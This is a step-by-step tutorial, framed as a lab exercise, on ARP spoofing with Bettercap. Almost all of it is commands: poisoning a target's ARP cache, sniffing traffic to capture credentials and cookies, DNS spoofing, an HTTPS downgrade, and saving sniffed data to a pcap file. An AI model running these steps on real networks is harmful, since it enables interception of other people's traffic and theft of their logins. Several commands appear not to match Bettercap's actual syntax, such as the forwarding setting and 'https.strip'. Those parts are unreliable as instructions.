**ARP spoofing using Bettercap** in a safe and controlled lab environment. Bettercap automates ARP spoofing and allows real-time traffic sniffing, MITM, DNS spoofing, and more.




## ✅ Lab Setup Requirements

* **Attacker:** Kali Linux with Bettercap installed (`sudo apt install bettercap`)
* **Victim Machine:** Windows/Linux VM or device on the same LAN/Wi-Fi
* **Network:** All devices on the same subnet (e.g., `192.168.1.0/24`)

---

## 🔧 Step-by-Step ARP Spoofing with Bettercap

### 1. **Launch Bettercap**

Start Bettercap with your active interface (e.g., `eth0`, `wlan0`, etc.):

```bash
sudo bettercap -iface eth0
```

---

### 2. **Enable IP Forwarding (required for MITM)**

In Bettercap terminal:

```bash
set net.ipv4.forwarding true
```



### 3. **Set ARP Spoofing Target**

Find the victim IP (e.g., `192.168.1.10`), then:

```bash
set arp.spoof.targets 192.168.1.10
arp.spoof on
```



### 4. **Enable Packet Sniffing**

```bash
net.sniff on
```

Optional: Show full details:

```bash
set net.sniff.verbose true
```



### 5. **Monitor Output**

As traffic is routed through your machine, Bettercap will display captured credentials, cookies, or HTTP requests.



## Optional Add-ons

### DNS Spoofing

```bash
set dns.spoof.domains example.com
set dns.spoof.address 192.168.1.99
dns.spoof on
```

### HTTPS Downgrade (if not blocked by HSTS)

```bash
https.proxy on
https.strip on
```

> Modern browsers often block this due to HSTS, so results may vary.



## Exit and Clean Up

```bash
arp.spoof off
net.sniff off
exit
```

Also, disable IP forwarding:

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```



## Bonus: Save Output

You can log sniffed data like this:

```bash
set net.sniff.output /path/to/output.pcap
```
